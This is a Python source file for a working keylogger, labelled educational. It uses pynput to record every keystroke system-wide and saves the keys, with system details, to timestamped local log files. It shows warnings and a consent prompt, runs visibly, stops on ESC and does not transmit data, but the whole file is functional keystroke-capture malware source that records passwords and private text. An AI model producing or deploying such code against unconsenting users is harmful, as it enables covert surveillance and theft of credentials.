"""
Educational Keylogger - For Learning Purposes Only
Author: Your Name
Warning: Use only on systems you own or have explicit permission to monitor
"""

from pynput import keyboard
import logging
from datetime import datetime
import os
import sys
import platform
import json

class KeyLogger:
    def __init__(self, log_dir="keylogs"):
        """Initialize the keylogger with logging configuration"""
        self.log_dir = log_dir
        self.create_log_directory()
        self.setup_logging()
        self.key_buffer = []
        self.buffer_size = 10  # Save after every 10 keys
        
    def create_log_directory(self):
        """Create directory for log files if it doesn't exist"""
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
            print(f"[+] Created log directory: {self.log_dir}")
    
    def setup_logging(self):
        """Setup logging configuration"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_filename = os.path.join(self.log_dir, f"keylog_{timestamp}.txt")
        
        # Configure logging
        logging.basicConfig(
            filename=log_filename,
            level=logging.DEBUG,
            format='%(asctime)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
        self.logger = logging.getLogger()
        print(f"[+] Logging to: {log_filename}")
        
        # Log system information
        self.log_system_info()
    
    def log_system_info(self):
        """Log system information at the start"""
        info = {
            "System": platform.system(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor()
        }
        
        self.logger.info("="*50)
        self.logger.info("KEYLOGGER SESSION STARTED")
        self.logger.info("="*50)
        for key, value in info.items():
            self.logger.info(f"{key}: {value}")
        self.logger.info("="*50)
    
    def process_key(self, key):
        """Process and format the key press"""
        try:
            # Handle alphanumeric keys
            key_char = key.char
            return key_char
        except AttributeError:
            # Handle special keys
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '\n[ENTER]\n',
                keyboard.Key.tab: '\t[TAB]',
                keyboard.Key.backspace: '[BACKSPACE]',
                keyboard.Key.shift: '[SHIFT]',
                keyboard.Key.ctrl: '[CTRL]',
                keyboard.Key.alt: '[ALT]',
                keyboard.Key.caps_lock: '[CAPS_LOCK]',
                keyboard.Key.esc: '[ESC]',
                keyboard.Key.delete: '[DELETE]',
                keyboard.Key.up: '[UP]',
                keyboard.Key.down: '[DOWN]',
                keyboard.Key.left: '[LEFT]',
                keyboard.Key.right: '[RIGHT]',
            }
            return special_keys.get(key, f'[{str(key)}]')
    
    def on_press(self, key):
        """Callback function when a key is pressed"""
        try:
            key_data = self.process_key(key)
            self.key_buffer.append(key_data)
            
            # Save buffer when it reaches the specified size
            if len(self.key_buffer) >= self.buffer_size:
                self.flush_buffer()
                
        except Exception as e:
            self.logger.error(f"Error processing key: {e}")
    
    def flush_buffer(self):
        """Write buffered keys to log file"""
        if self.key_buffer:
            log_text = ''.join(self.key_buffer)
            self.logger.info(log_text)
            self.key_buffer = []
    
    def on_release(self, key):
        """Callback function when a key is released"""
        # Stop listener on ESC key
        if key == keyboard.Key.esc:
            print("\n[!] ESC pressed. Stopping keylogger...")
            self.flush_buffer()  # Save remaining keys
            return False
    
    def start(self):
        """Start the keylogger"""
        print("\n" + "="*60)
        print("EDUCATIONAL KEYLOGGER - RUNNING")
        print("="*60)
        print("[!] WARNING: This is for educational purposes only!")
        print("[!] Only use on systems you own or have permission to monitor")
        print("="*60)
        print("[*] Keylogger is now active...")
        print("[*] Press ESC to stop logging")
        print("="*60 + "\n")
        
        # Start listening to keyboard events
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()
        
        # Final cleanup
        self.flush_buffer()
        self.logger.info("="*50)
        self.logger.info("KEYLOGGER SESSION ENDED")
        self.logger.info("="*50)
        print("\n[+] Keylogger stopped successfully")
        print(f"[+] Logs saved in: {self.log_dir}/")

def display_banner():
    """Display startup banner"""
    banner = """
    ╔═══════════════════════════════════════════════════════╗
    ║         EDUCATIONAL KEYLOGGER PROJECT                 ║
    ║         For Learning Purposes Only                    ║
    ╚═══════════════════════════════════════════════════════╝
    """
    print(banner)

def main():
    """Main function to run the keylogger"""
    display_banner()
    
    # Show ethical warning
    print("[!] ETHICAL NOTICE:")
    print("    - Use only on your own devices")
    print("    - Get explicit permission before monitoring others")
    print("    - Unauthorized keylogging is illegal")
    print()
    
    consent = input("[?] Do you have permission to run this keylogger? (yes/no): ")
    
    if consent.lower() != 'yes':
        print("[!] Exiting... Use responsibly!")
        sys.exit(0)
    
    try:
        # Create and start keylogger
        keylogger = KeyLogger()
        keylogger.start()
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
